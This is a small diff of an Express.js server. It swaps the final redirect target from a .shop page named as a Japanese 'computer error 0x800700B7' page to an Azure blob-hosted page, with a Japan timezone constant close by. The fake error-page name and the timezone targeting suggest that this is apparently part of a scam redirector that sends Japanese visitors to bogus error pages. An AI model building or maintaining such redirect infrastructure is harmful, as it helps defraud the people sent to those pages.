@@ -2,7 +2,7 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://fooidemix.shop/コンピューターエラー0x800700B7.html";
+const FINAL_REDIRECT_URL = "https://jp13472.blob.core.windows.net/$web/index.html";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ CORS middleware (required for fetch)
